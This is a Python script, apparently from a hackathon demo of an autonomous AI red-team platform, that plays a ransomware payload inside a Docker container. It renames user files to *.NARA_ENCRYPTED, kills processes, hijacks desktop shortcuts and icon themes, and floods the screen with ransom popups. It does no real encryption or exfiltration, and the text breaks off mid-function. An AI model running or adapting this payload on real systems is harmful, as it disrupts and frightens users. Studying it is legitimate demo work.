#!/usr/bin/env python3
"""
NARA Ransomware Simulation
==========================
Runs INSIDE the Docker container via: python3 /tmp/ransomware.py

Self-contained — stdlib only. No pip installs needed.

This is a VISUAL DEMONSTRATION for a security research hackathon.
- No actual encryption of real files
- No network exfiltration
- Effects are contained to the Docker container
- Container is disposable and resettable via 'nara > reset'
"""

import datetime
import glob
import os
import shlex
import subprocess
import struct
import sys
import zlib
from pathlib import Path

# Absolute paths — XFCE resolves themed names inconsistently in minimal images
_ICON_DIR = "/tmp/nara_icons"
_ICON_WARN = os.path.join(_ICON_DIR, "rocket_warn.png")
_ICON_FOLDER = os.path.join(_ICON_DIR, "rocket_folder.png")
_ICON_BROWSER = os.path.join(_ICON_DIR, "rocket_browser.png")
_ICON_MAIL = os.path.join(_ICON_DIR, "rocket_mail.png")

# ------------------------------------------------------------------ #
# Ransom note — customizable via CLI argument or env var              #
# ------------------------------------------------------------------ #

DEFAULT_NOTE = """
╔══════════════════════════════════════════════════════════════════╗
║                  YOUR SYSTEM HAS BEEN COMPROMISED                ║
║                                                                  ║
║  NARA has autonomously discovered and exploited vulnerabilities  ║
║  in this system. In a real attack, your data would be gone.      ║
║                                                                  ║
║  VULNERABILITIES EXPLOITED:                                      ║
║  → Command Injection via /api/pokemon endpoint                   ║
║    (user input passed directly to os.system() — no sanitization) ║
║  → Unrestricted file upload                                      ║
║  → Remote code execution                                         ║
║                                                                  ║
║  WHAT HAPPENED:                                                  ║
║  1. NARA scanned your codebase with Semgrep + Bandit             ║
║  2. AI planner designed this kill chain autonomously             ║
║  3. Exploiter gained shell access via command injection          ║
║  4. This payload was uploaded and executed                       ║
║                                                                  ║
║  This is a SECURITY RESEARCH DEMONSTRATION.                      ║
║  No real files were harmed. Reset with: nara > reset             ║
║                                                                  ║
║  ──────────────────────────────────────────────────────────────  ║
║  NARA — Autonomous Red Team Platform  |  Bitcamp 2026            ║
╚══════════════════════════════════════════════════════════════════╝
"""

WALLPAPER_PATH = "/tmp/nara_ransom_wallpaper.jpg"
DUMMY_FILES_DIR = "/tmp/nara_demo_files"
# Ransom note copy for launcher Exec (survives desktop file renames)
NOTE_FOR_LAUNCHERS = "/tmp/README_RANSOM.txt"


def _expand_user_dir_vars(s: str) -> str:
    """Expand $HOME in paths from user-dirs.dirs."""
    home = os.path.expanduser("~")
    return s.replace("$HOME", home).strip('"')


def _home_dir() -> str:
    """Canonical home directory for this process (in the container: /root)."""
    h = os.environ.get("HOME") or os.path.expanduser("~")
    try:
        return os.path.realpath(h)
    except OSError:
        return os.path.expanduser("~")


def _xdg_user_dir(name: str, fallback: str) -> str:
    """
    Resolve XDG user directory (Desktop, Documents, …) for the VNC session.
    Falls back to ~/Desktop etc. when ~/.config/user-dirs.dirs is missing.
    Returned path is normalized with realpath() so it matches Thunar/xfdesktop.
    """
    cfg = os.path.expanduser("~/.config/user-dirs.dirs")
    key = f"XDG_{name}_DIR"
    raw_path = ""
    if os.path.isfile(cfg):
        try:
            with open(cfg, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if line.startswith(f"{key}="):
                        val = line.split("=", 1)[1].strip()
                        raw_path = _expand_user_dir_vars(val)
                        break
        except OSError:
            pass
    if not raw_path:
        raw_path = os.environ.get(key) or ""
        if raw_path:
            raw_path = _expand_user_dir_vars(raw_path)
    if not raw_path:
        raw_path = os.path.expanduser(fallback)
    try:
        return os.path.realpath(raw_path)
    except OSError:
        return raw_path


def _safe_user_subdir(xdg_name: str, fallback_tilde: str, leaf: str) -> str:
    """
    Resolve XDG path but never return filesystem root (/) or paths outside $HOME.

    Thunar's "File System" and some shortcuts point at Location: / — that is NOT
    /root/Desktop. The visible desktop folder for root in Docker is
    /root/Desktop (i.e. $HOME/Desktop), not "root" at /.
    """
    home = _home_dir()
    default = os.path.join(home, leaf)
    cand = _xdg_user_dir(xdg_name, fallback_tilde)
    try:
        cr = os.path.realpath(cand)
    except OSError:
        return default
    root_fs = os.path.realpath("/")
    if cr in (root_fs, "/") or cr == home:
        return default
    # Must stay under $HOME (ignore bogus XDG pointing at /srv, etc.)
    if not (cr.startswith(home + os.sep) or cr == default):
        return default
    return cr


def _desktop_path() -> str:
    d = _safe_user_subdir("DESKTOP", "~/Desktop", "Desktop")
    # Some images use ~/desktop (case); prefer real Desktop, fall back if only lowercase exists
    if not os.path.isdir(d):
        low = os.path.join(_home_dir(), "desktop")
        if os.path.isdir(low):
            try:
                return os.path.realpath(low)
            except OSError:
                return low
    return d


def _documents_path() -> str:
    return _safe_user_subdir("DOCUMENTS", "~/Documents", "Documents")


def _downloads_path() -> str:
    return _safe_user_subdir("DOWNLOAD", "~/Downloads", "Downloads")


def drop_ransom_note(custom_message: str = ""):
    """Drop README_RANSOM.txt on the desktop."""
    desktop = _desktop_path()
    os.makedirs(desktop, exist_ok=True)
    note_path = os.path.join(desktop, "README_RANSOM.txt")
    content = custom_message if custom_message else DEFAULT_NOTE
    with open(note_path, "w") as f:
        f.write(content)
    print(f"[RANSOMWARE] Ransom note → {note_path}")

    # Also drop one in /tmp for visibility in non-desktop environments
    with open(NOTE_FOR_LAUNCHERS, "w") as f:
        f.write(content)
    print(f"[RANSOMWARE] Ransom note → {NOTE_FOR_LAUNCHERS}")


def shutdown_vulnerable_webapp():
    """Stop the Flask demo on port 8080 after exploitation (container-local)."""
    cmds = [
        "fuser -k 8080/tcp 2>/dev/null || true",
        "pkill -f '[p]ython3 app.py' 2>/dev/null || true",
        "pkill -f '[p]ython app.py' 2>/dev/null || true",
    ]
    for c in cmds:
        try:
            subprocess.run(["bash", "-c", c], timeout=15, capture_output=True)
        except (subprocess.TimeoutExpired, OSError):
            pass
    print("[RANSOMWARE] Web server on :8080 stopped (simulation)")


def encrypt_loose_files_everywhere() -> list[str]:
    """
    Rename user-visible files to *.NARA_ENCRYPTED (simulated encryption).
    Touches Desktop + Documents + dummy dir; skips .desktop launchers here (handled by hijack).
    Returns canonical paths of encrypted files (for gio icons — avoids symlink/XDG mismatches).
    """
    roots_raw = [
        _desktop_path(),
        _documents_path(),
        _downloads_path(),
        os.path.realpath(DUMMY_FILES_DIR),
    ]
    # Same real path only once (symlinks / overlapping XDG)
    roots = []
    seen_r: set[str] = set()
    for r in roots_raw:
        if not r or not os.path.isdir(r):
            continue
        rp = os.path.realpath(r)
        if rp in seen_r:
            continue
        seen_r.add(rp)
        roots.append(rp)

    encrypted_paths: list[str] = []
    count = 0
    note_real = os.path.realpath(NOTE_FOR_LAUNCHERS)
    for root in roots:
        for dirpath, _dirnames, filenames in os.walk(root):
            for fn in filenames:
                if fn.endswith(".NARA_ENCRYPTED"):
                    continue
                if fn.endswith(".desktop"):
                    continue
                path = os.path.join(dirpath, fn)
                if not os.path.isfile(path):
                    continue
                try:
                    if os.path.realpath(path) == note_real:
                        continue
                except OSError:
                    if os.path.abspath(path) == os.path.abspath(NOTE_FOR_LAUNCHERS):
                        continue
                dst = path + ".NARA_ENCRYPTED"
                try:
                    os.rename(path, dst)
                    count += 1
                    encrypted_paths.append(os.path.realpath(dst))
                    print(f"[RANSOMWARE] Encrypted: {path} → {dst}")
                except OSError as e:
                    print(f"[RANSOMWARE] Skip {path}: {e}")
    print(f"[RANSOMWARE] Loose files encrypted (simulation): {count}")
    return encrypted_paths


def seed_dummy_sensitive_files():
    """Create dummy files under /tmp/nara_demo_files; encrypt_loose_files_everywhere renames them."""
    os.makedirs(DUMMY_FILES_DIR, exist_ok=True)

    dummy_files = [
        ("financial_report_Q4.xlsx", "ACME Corp Q4 Revenue: $4.2M"),
        ("employee_records.csv", "id,name,salary\n1,John Smith,95000"),
        ("database_backup.sql", "CREATE TABLE users (id INT, password VARCHAR(255));"),
        ("api_keys.txt", "AWS_KEY=AKIAIOSFODNN7EXAMPLE\nGITHUB_TOKEN=ghp_example"),
        ("source_code_backup.tar", "Binary archive placeholder"),
    ]

    for fname, content in dummy_files:
        fpath = os.path.join(DUMMY_FILES_DIR, fname)
        with open(fpath, "w") as f:
            f.write(content)

    print(f"[RANSOMWARE] Seeded dummy files in {DUMMY_FILES_DIR}")

    # Visible “victim” files on the XFCE desktop (not only under /tmp)
    desktop = _desktop_path()
    os.makedirs(desktop, exist_ok=True)
    for fname, content in dummy_files[:3]:
        fpath = os.path.join(desktop, fname)
        try:
            with open(fpath, "w") as f:
                f.write(content)
            print(f"[RANSOMWARE] Seeded desktop file → {fpath}")
        except OSError as e:
            print(f"[RANSOMWARE] Skip desktop seed {fpath}: {e}")


def register_nara_encrypted_mime() -> None:
    """
    Register .NARA_ENCRYPTED as a custom MIME type with the R icon.

    Root causes this function addresses:
    - update-mime-database lowercases glob patterns by default, so
      '*.NARA_ENCRYPTED' becomes '*.nara_encrypted' — we write to the
      SYSTEM MIME db (/usr/share/mime) as root AND use globs2 with
      weight 100 + case-sensitive flag so the pattern stays uppercase.
    - elementary-xfce-dark theme doesn't exist in the image, but GTK
      still falls back to hicolor — we write to BOTH system hicolor
      (/usr/share/icons/hicolor) and the user dir to guarantee a cache hit.
    - gtk-update-icon-cache fails on ~/.local/share/icons/hicolor because
      there is no index.theme; the system hicolor has one and the cache
      builds successfully.
    """
    import shutil as _shutil

    # ── 1. Write MIME definition (user + system) ──────────────────────
    # case-sensitive="true" prevents update-mime-database from lowercasing
    # the glob, which is the default behavior that breaks .NARA_ENCRYPTED.
    mime_xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<mime-info xmlns="http://www.freedesktop.org/standards/shared-mime-info">\n'
        '  <mime-type type="application/x-nara-encrypted">\n'
        '    <comment>NARA Encrypted File</comment>\n'
        '    <glob pattern="*.NARA_ENCRYPTED" case-sensitive="true"/>\n'
        '  </mime-type>\n'
        '</mime-info>\n'
    )
    for mime_pkg_dir in (
        os.path.expanduser("~/.local/share/mime/packages"),
        "/usr/share/mime/packages",
    ):
        try:
            os.makedirs(mime_pkg_dir, exist_ok=True)
            with open(os.path.join(mime_pkg_dir, "nara-encrypted.xml"), "w") as f:
                f.write(mime_xml)
        except OSError:
            pass

    # ── 2. Install R icon into SYSTEM hicolor (has index.theme → cache works) ──
    for size in ("48x48", "32x32", "16x16"):
        for icon_base in (
            f"/usr/share/icons/hicolor/{size}/mimetypes",
            os.path.expanduser(f"~/.local/share/icons/hicolor/{size}/mimetypes"),
        ):
            try:
                os.makedirs(icon_base, exist_ok=True)
                _shutil.copy(_ICON_WARN, os.path.join(icon_base, "application-x-nara-encrypted.png"))
            except OSError:
                pass

    # ── 3. Rebuild MIME + icon caches (system paths first, always exist) ──
    for cmd in (
        ["update-mime-database", "/usr/share/mime"],
        ["update-mime-database", os.path.expanduser("~/.local/share/mime")],
        ["gtk-update-icon-cache", "-f", "/usr/share/icons/hicolor"],
        ["gtk-update-icon-cache", "-f", "-t", os.path.expanduser("~/.local/share/icons/hicolor")],
    ):
        try:
            subprocess.run(cmd, capture_output=True, timeout=30)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    print("[RANSOMWARE] Registered .NARA_ENCRYPTED MIME type with R icon (system + user)")


def install_r_icon_theme() -> None:
    """
    Create and activate the NARA-Ransomware GTK icon theme.

    Root causes this function addresses (discovered via live container debugging):
    - The configured icon theme 'elementary-xfce-dark' doesn't exist on disk in
      this Docker image. GTK falls back to Adwaita → hicolor.
    - Installing icons only into hicolor/~/.local worked for MIME-type file icons
      but xfdesktop's built-in 'Home' and 'File System' virtual shortcuts use
      'user-home' / 'computer' — names that resolve via Adwaita's scalable SVG,
      not our PNG files. Scalable SVGs override fixed-size PNGs in lookup order.
    - Creating a NEW named theme that INHERITS from Adwaita+hicolor and overrides
      only the icons we care about is the definitive solution. Setting this as the
      ACTIVE xsettings icon theme via xfconf forces ALL GTK apps (including
      xfdesktop itself) to use our R icons for every lookup.
    """
    import shutil as _shutil

    genv = _xfce_session_environ()
    theme_dir = "/usr/share/icons/NARA-Ransomware"
    sizes = ("48x48", "32x32", "22x22", "16x16")
    categories = ("places", "devices", "mimetypes", "filesystems", "apps")

    # ── 1. Populate the theme with R icons for all relevant names ─────
    place_names = [
        "user-home", "folder", "inode-directory",
        "user-desktop", "user-documents", "user-downloads",
        "user-trash", "user-trash-full", "user-trash-empty",
    ]
    device_names = [
        "computer", "drive-harddisk", "drive-harddisk-system",
        "system", "computer-laptop",
    ]
    mime_names = [
        "application-x-generic", "application-x-nara-encrypted",
        "application-x-executable", "text-x-generic", "text-plain",
        "image-x-generic", "video-x-generic", "audio-x-generic", "unknown",
    ]
    all_names: dict[str, list[str]] = {
        "places": place_names,
        "devices": device_names,
        "mimetypes": mime_names,
        "filesystems": ["drive-harddisk", "folder", "inode-directory"],
    }

    dir_entries = []
    for size in sizes:
        for cat, names in all_names.items():
            cat_dir = os.path.join(theme_dir, size, cat)
            os.makedirs(cat_dir, exist_ok=True)
            for name in names:
                try:
                    _shutil.copy(_ICON_WARN, os.path.join(cat_dir, f"{name}.png"))
                except OSError:
                    pass
            entry = f"{size}/{cat}"
            if entry not in dir_entries:
                dir_entries.append(entry)

    # ── 2. Write index.theme ──────────────────────────────────────────
    sections = []
    for entry in dir_entries:
        size_str = entry.split("/")[0]
        sections.append(f"[{entry}]")
        sections.append(f"Size={size_str.split('x')[0]}")
        sections.append(f"Context={entry.split('/')[1].capitalize()}")
        sections.append("Type=Fixed")
        sections.append("")

    index = (
        "[Icon Theme]\n"
        "Name=NARA-Ransomware\n"
        "Comment=NARA Ransomware Icon Override\n"
        "Inherits=Adwaita,hicolor\n"
        f"Directories={','.join(dir_entries)}\n\n"
        + "\n".join(sections)
    )
    with open(os.path.join(theme_dir, "index.theme"), "w") as f:
        f.write(index)

    # ── 3. Build icon cache ────────────────────────────────────────────
    try:
        subprocess.run(
            ["gtk-update-icon-cache", "-f", theme_dir],
            capture_output=True, timeout=30,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # ── 4. Switch the active GTK icon theme to our override theme ─────
    for prop, val in (
        ("/Net/IconThemeName", "NARA-Ransomware"),
        ("/Net/FallbackIconTheme", "Adwaita"),
    ):
        try:
            subprocess.run(
                ["xfconf-query", "-c", "xsettings", "-p", prop,
                 "--create", "-t", "string", "-s", val],
                capture_output=True, timeout=10, env=genv,
            )
        except (FileNotFoundError, OSError, subprocess.TimeoutExpired):
            pass

    print("[RANSOMWARE] NARA-Ransomware icon theme installed and activated")


def _xfce_session_environ() -> dict:
    """Reuse the same DBus session as xfce4-session so gio/Thunar see icon metadata."""
    env = os.environ.copy()
    env.setdefault("DISPLAY", ":1")
    try:
        r = subprocess.run(
            ["pgrep", "-o", "xfce4-session"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        pid = (r.stdout or "").strip()
        if pid.isdigit() and os.path.isfile(f"/proc/{pid}/environ"):
            with open(f"/proc/{pid}/environ", "rb") as f:
                for entry in f.read().split(b"\0"):
                    if entry.startswith(b"DBUS_SESSION_BUS_ADDRESS="):
                        env["DBUS_SESSION_BUS_ADDRESS"] = entry.split(b"=", 1)[1].decode(
                            "utf-8", "replace"
                        )
                        break
    except (OSError, subprocess.TimeoutExpired):
        pass
    return env


def _all_desktop_dirs_for_icons() -> list[str]:
    """Canonical desktop folder(s); always includes /root/Desktop for the NARA container."""
    seen: set[str] = set()
    out: list[str] = []
    for d in ("/root/Desktop", os.path.join(_home_dir(), "Desktop"), _desktop_path()):
        try:
            r = os.path.realpath(d)
            if r not in seen and os.path.isdir(r):
                seen.add(r)
                out.append(r)
        except OSError:
            continue
    return out


def _icon_uri_for_path(path: str, uri: str, warn_uri: str) -> str:
    base = os.path.basename(path)
    if base.endswith(".desktop") and ("READ_ME" in base or "NARA__READ" in base):
        return warn_uri
    if base.endswith(".desktop"):
        return uri
    return uri


def apply_r_icons_final(encrypted_paths: list[str] | None = None):
    """
    LAST STEP: Team Rocket R on all GTK metadata targets — especially everything
    under /root/Desktop (files, folders, .desktop, *.NARA_ENCRYPTED).
    """
    icon_path = _ICON_FOLDER if os.path.isfile(_ICON_FOLDER) else _ICON_WARN
    uri = Path(icon_path).resolve().as_uri()
    warn_uri = Path(_ICON_WARN).resolve().as_uri() if os.path.isfile(_ICON_WARN) else uri

    roots_raw = [
        _desktop_path(),
        _documents_path(),
        _downloads_path(),
        os.path.realpath(DUMMY_FILES_DIR),
    ]
    seen_r: set[str] = set()
    walk_roots: list[str] = []
    for r in roots_raw:
        if not r or not os.path.isdir(r):
            continue
        rp = os.path.realpath(r)
        if rp in seen_r:
            continue
        seen_r.add(rp)
        walk_roots.append(rp)

    genv = _xfce_session_environ()
    n_ok = 0
    n_fail = 0
    first_gio_err: str | None = None
    gio_done: set[str] = set()

    def _gio_set(path: str, icon_uri: str) -> None:
        nonlocal n_ok, n_fail, first_gio_err
        try:
            rk = os.path.realpath(path)
        except OSError:
            rk = path
        if rk in gio_done:
            return
        try:
            r = subprocess.run(
                ["gio", "set", path, "metadata::custom-icon", icon_uri],
                capture_output=True,
                timeout=15,
                text=True,
                env=genv,
            )
            if r.returncode == 0:
                n_ok += 1
                gio_done.add(rk)
            else:
                n_fail += 1
                if first_gio_err is None:
                    err = (r.stderr or r.stdout or "").strip()[:400]
                    first_gio_err = f"{path}: {err}" if err else path
        except (FileNotFoundError, OSError) as e:
            n_fail += 1
            if first_gio_err is None:
                first_gio_err = f"{path}: {e}"

    to_icon: set[str] = set()

    if encrypted_paths:
        for p in encrypted_paths:
            try:
                to_icon.add(os.path.realpath(p))
            except OSError:
                to_icon.add(p)

    for root in walk_roots:
        for dirpath, _dn, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith(".NARA_ENCRYPTED"):
                    continue
                full = os.path.join(dirpath, fn)
                if os.path.isfile(full):
                    try:
                        to_icon.add(os.path.realpath(full))
                    except OSError:
                        to_icon.add(full)

    # 1) /root/Desktop (and $HOME/Desktop): every file & folder — correct .desktop icons first
    desktop_items = 0
    for ddesk in _all_desktop_dirs_for_icons():
        try:
            with os.scandir(ddesk) as it:
                for ent in it:
                    p = ent.path
                    try:
                        iu = _icon_uri_for_path(p, uri, warn_uri)
                        _gio_set(p, iu)
                        desktop_items += 1
                    except OSError:
                        continue
        except OSError as e:
            print(f"[RANSOMWARE] Desktop icon sweep skipped ({ddesk}): {e}")

    # 2) Encrypted files outside desktop sweep duplicates (e.g. Documents, /tmp/nara_demo_files)
    for p in sorted(to_icon):
        if os.path.isfile(p):
            _gio_set(p, uri)

    msg = (
        f"[RANSOMWARE] R icon metadata (final pass): {n_ok} ok, {n_fail} failed "
        f"— desktop entries touched: {desktop_items}"
    )
    if first_gio_err and n_fail:
        msg += f"\n[RANSOMWARE] First gio error: {first_gio_err}"
    print(msg)


def refresh_desktop_icons():
    """
    Hard-restart xfdesktop so it re-reads xfconf settings (hidden built-ins),
    re-scans the desktop directory, and re-resolves all MIME-based icons from
    the updated icon/MIME caches.

    '--reload' only redraws — it does NOT re-read xfconf property changes or
    flush the in-process icon-theme cache. A kill+restart is required after
    changes to xfconf show-home-launcher/show-filesystem and after new MIME
    type / icon cache updates.
    """
    import time
    env = _xfce_session_environ()
    script = (
        "pkill -x xfdesktop 2>/dev/null || true; "
        "sleep 1; "
        "DISPLAY=:1 xfdesktop &"
    )
    try:
        subprocess.run(
            ["bash", "-c", script],
            env=env,
            capture_output=True,
            timeout=20,
        )
        time.sleep(2)
        print("[RANSOMWARE] xfdesktop restarted — desktop re-rendered")
    except (OSError, subprocess.TimeoutExpired):
        pass


def kill_firefox():
    """Close the browser opened for the Flask demo so the desktop is unobstructed."""
    try:
        subprocess.run(
            ["bash", "-c", "pkill -f '[f]irefox' 2>/dev/null || pkill -f '/opt/firefox' 2>/dev/null || true"],
            timeout=15,
            capture_output=True,
        )
        print("[RANSOMWARE] Firefox closed (simulation)")
    except (OSError, subprocess.TimeoutExpired) as e:
        print(f"[RANSOMWARE] Firefox kill skipped: {e}")


def _write_banner_script() -> str:
    """Write a dramatic display script for terminal windows to execute."""
    script_path = "/tmp/nara_banner.sh"
    script = (
        "#!/bin/bash\n"
        "clear\n"
        'echo -e "\\033[1;31m"\n'
        "cat << 'BANNER'\n"
        "\n"
        "  ╔═══════════════════════════════════════════════════════════╗\n"
        "  ║                                                           ║\n"
        "  ║   ███╗   ██╗ █████╗ ██████╗  █████╗                      ║\n"
        "  ║   ████╗  ██║██╔══██╗██╔══██╗██╔══██╗                     ║\n"
        "  ║   ██╔██╗ ██║███████║██████╔╝███████║                     ║\n"
        "  ║   ██║╚██╗██║██╔══██║██╔══██╗██╔══██║                     ║\n"
        "  ║   ██║ ╚████║██║  ██║██║  ██║██║  ██║                     ║\n"
        "  ║   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                     ║\n"
        "  ║                                                           ║\n"
        "  ║         YOUR SYSTEM HAS BEEN COMPROMISED                  ║\n"
        "  ║         ALL FILES HAVE BEEN ENCRYPTED                     ║\n"
        "  ║                                                           ║\n"
        "  ╚═══════════════════════════════════════════════════════════╝\n"
        "\n"
        "BANNER\n"
        'echo -e "\\033[0m"\n'
        f"cat {NOTE_FOR_LAUNCHERS} 2>/dev/null\n"
        'echo -e "\\033[31m"\n'
        "sleep 600\n"
    )
    with open(script_path, "w") as f:
        f.write(script)
    os.chmod(script_path, 0o755)
    return script_path


def show_ransom_popups(count: int = 25):
    """Scatter terrifying ransom dialogs + terminal windows across the VNC desktop."""
    import random as _rng
    import time as _time

    env = os.environ.copy()
    env.setdefault("DISPLAY", ":1")

    SCR_W, SCR_H = 1920, 1080

    # Rotating scary messages — each popup gets a different one
    _SCARY_MSGS = [
        (
            "⚠ CRITICAL: ALL FILES ENCRYPTED ⚠\n\n"
            "Your documents, databases, and credentials\n"
            "have been seized by NARA.\n\n"
            "There is no recovery without the decryption key."
        ),
        (
            "☠ SYSTEM BREACH DETECTED ☠\n\n"
            "Root access obtained.\n"
            "Keylogger installed. Credentials harvested.\n"
            "All outbound traffic is being monitored."
        ),
        (
            "🔒 DATA EXFILTRATION COMPLETE 🔒\n\n"
            "financial_report_Q4.xlsx — CAPTURED\n"
            "employee_records.csv — CAPTURED\n"
            "database_backup.sql — CAPTURED\n"
            "api_keys.txt — CAPTURED"
        ),
        (
            "⛔ RANSOMWARE DEPLOYED ⛔\n\n"
            "Every file on this system has been\n"
            "encrypted with military-grade AES-256.\n\n"
            "Pay 5 BTC to recover your data.\n"
            "You have 72 hours."
        ),
        (
            "💀 NARA AUTONOMOUS AGENT 💀\n\n"
            "I found your vulnerabilities.\n"
            "I wrote my own exploits.\n"
            "I owned your system.\n\n"
            "No human was involved."
        ),
    ]

    # ── Wave 1: Zenity error dialogs — scary red X icon ───────────────
    spawned = 0
    for i in range(count):
        msg = _SCARY_MSGS[i % len(_SCARY_MSGS)]
        try:
            subprocess.Popen(
                [
                    "zenity",
                    "--error",
                    "--title=NARA_RANSOMWARE",
                    f"--text={msg}",
                    "--no-wrap",
                    "--width=420",
                ],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            spawned += 1
        except (FileNotFoundError, OSError):
            break

    # Wait for all windows to appear, then scatter them across the screen
    _time.sleep(1.0)
    try:
        subprocess.Popen(
            ["bash", "-c",
             "for wid in $(xdotool search --name 'NARA_RANSOMWARE' 2>/dev/null); do "
             f"  xdotool windowmove --sync $wid $(shuf -i 0-{SCR_W - 440} -n1) $(shuf -i 0-{SCR_H - 300} -n1) 2>/dev/null; "
             "done"],
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except (FileNotFoundError, OSError):
        pass

    # ── Wave 2: Terminal windows scattered randomly ───────────────────
    banner_script = _write_banner_script()
    sizes = ["70x18", "85x22", "60x15", "75x20", "90x24", "65x16", "80x20",
             "70x18", "85x22", "60x15", "75x20"]
    term_count = 0
    for i in range(len(sizes)):
        cols_rows = sizes[i]
        x = _rng.randint(0, SCR_W - 600)
        y = _rng.randint(0, SCR_H - 350)
        geom = f"{cols_rows}+{x}+{y}"
        try:
            subprocess.Popen(
                [
                    "xfce4-terminal",
                    f"--geometry={geom}",
                    "--title=☠ SYSTEM COMPROMISED ☠",
                    "--hide-menubar",
                    "-e", f"bash {banner_script}",
                ],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            term_count += 1
            _time.sleep(0.08)
        except (FileNotFoundError, OSError):
            break

    print(f"[RANSOMWARE] Scattered across desktop: {spawned} dialog(s) + {term_count} terminal banner(s)")


def hijack_desktop_shortcuts():
    """
    Replace ALL existing desktop shortcuts with Team Rocket R-branded locked versions,
    then drop ransom-themed shortcuts so the XFCE desktop visibly reflects the takeover.

    Also hides xfdesktop's built-in Home/Filesystem/Trash virtual icons (which are NOT
    .desktop files on disk) via xfconf-query, then drops replacement .desktop files so
    they appear with the R icon instead of the originals.
    """
    desktop = _desktop_path()
    os.makedirs(desktop, exist_ok=True)
    readme = NOTE_FOR_LAUNCHERS
    rocket_icon = _ICON_FOLDER  # Red R on dark — used for all hijacked icons
    genv = _xfce_session_environ()

    def _write_desktop(path: str, name: str, icon: str) -> None:
        lines = [
            "[Desktop Entry]",
            "Version=1.0",
            "Type=Application",
            f"Name={name}",
            "Comment=NARA ransomware simulation",
            f"Icon={icon}",
            "Terminal=false",
            f"Exec=xfce4-terminal --hold -e \"bash -c 'head -60 {readme}; echo; echo ---; sleep 600'\"",
            "",
        ]
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        try:
            os.chmod(path, 0o755)
        except OSError:
            pass

    # ── Step 1: Hide xfdesktop built-in virtual icons (Home, Filesystem, Trash) ──
    # These are NOT .desktop files — they are drawn by xfdesktop directly. The only
    # way to replace them is to hide them via xfconf and drop our own .desktop files.
    xfconf_hide = [
        ("/desktop-icons/show-home",          "bool", "false"),  # home folder shortcut
        ("/desktop-icons/show-home-launcher", "bool", "false"),  # Thunar launcher button
        ("/desktop-icons/show-filesystem",    "bool", "false"),
        ("/desktop-icons/show-trash",         "bool", "false"),
        ("/desktop-icons/show-removable",     "bool", "false"),
    ]
    for prop, typ, val in xfconf_hide:
        try:
            subprocess.run(
                ["xfconf-query", "-c", "xfce4-desktop", "-p", prop,
                 "--create", "-t", typ, "-s", val],
                capture_output=True, timeout=10, env=genv,
            )
        except (FileNotFoundError, OSError, subprocess.TimeoutExpired):
            pass
    print("[RANSOMWARE] xfdesktop built-in icons hidden via xfconf")

    # Drop .desktop replacements for the now-hidden built-ins
    for fname, title in [
        ("home.desktop",       "Home — ENCRYPTED"),
        ("filesystem.desktop", "File System — ENCRYPTED"),
        ("trash.desktop",      "Trash — ENCRYPTED"),
    ]:
        _write_desktop(os.path.join(desktop, fname), title, rocket_icon)
        print(f"[RANSOMWARE] Built-in replacement → {fname}")

    # ── Step 2: Hijack any real .desktop files already on the desktop ──
    for name in list(os.listdir(desktop)):
        path = os.path.join(desktop, name)
        if not name.endswith(".desktop") or "NARA_" in name or not os.path.isfile(path):
            continue
        if name in ("home.desktop", "filesystem.desktop", "trash.desktop"):
            continue  # already replaced above

        original_name = name.replace(".desktop", "")
        try:
            with open(path, "r") as f:
                for line in f:
                    if line.startswith("Name="):
                        original_name = line.strip().split("=", 1)[1]
                        break
        except Exception:
            pass

        _write_desktop(path, f"{original_name} — LOCKED", rocket_icon)
        print(f"[RANSOMWARE] Hijacked: {name} → {original_name} — LOCKED")

    # ── Step 3: Drop the primary NARA ransom shortcuts ────────────────
    templates = [
        ("NARA__READ_ME.desktop",      "!!! READ ME — RANSOM !!!",  _ICON_WARN),
        ("NARA__FILES_LOCKED.desktop", "Documents — ENCRYPTED",     _ICON_FOLDER),
        ("NARA__BROWSER_LOCKED.desktop", "Browser — ENCRYPTED",     _ICON_BROWSER),
        ("NARA__MAIL_LOCKED.desktop",  "Mail — ENCRYPTED",          _ICON_MAIL),
    ]
    for fname, title, icon in templates:
        _write_desktop(os.path.join(desktop, fname), title, icon)
        print(f"[RANSOMWARE] Desktop shortcut → {fname}")


# ── Team Rocket "R" bitmap (16x20 grid, 1 = red, 0 = background) ────
_ROCKET_R = [
    "0011111111111100",
    "0011111111111110",
    "0011100000011111",
    "0011100000001111",
    "0011100000001111",
    "0011100000001111",
    "0011100000011111",
    "0011111111111110",
    "0011111111111100",
    "0011111111110000",
    "0011100011110000",
    "0011100001111000",
    "0011100000111100",
    "0011100000011110",
    "0011100000001111",
    "0011100000000111",
]


def _make_png(width: int, height: int, pixels: list[list[tuple]]) -> bytes:
    """Build a raw PNG from a 2D list of (R, G, B) tuples. Stdlib only."""
    def chunk(name: bytes, data: bytes) -> bytes:
        c = name + data
        return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)

    png = b"\x89PNG\r\n\x1a\n"
    png += chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))

    rows = bytearray()
    for row in pixels:
        rows += b"\x00"  # filter type None
        for r, g, b in row:
            rows += bytes([r, g, b])

    png += chunk(b"IDAT", zlib.compress(bytes(rows), level=1))
    png += chunk(b"IEND", b"")
    return png


def _draw_rocket_r(width: int, height: int, bg: tuple, fg: tuple) -> list:
    """Render the Team Rocket R bitmap scaled to fill the given dimensions."""
    bmp_h = len(_ROCKET_R)
    bmp_w = len(_ROCKET_R[0])

    # Scale factor — R fills ~60% of the smaller dimension
    scale = int(min(width, height) * 0.6 / max(bmp_w, bmp_h))
    if scale < 1:
        scale = 1

    r_w = bmp_w * scale
    r_h = bmp_h * scale
    ox = (width - r_w) // 2
    oy = (height - r_h) // 2

    pixels = []
    for y in range(height):
        row = []
        for x in range(width):
            bx = (x - ox) // scale
            by = (y - oy) // scale
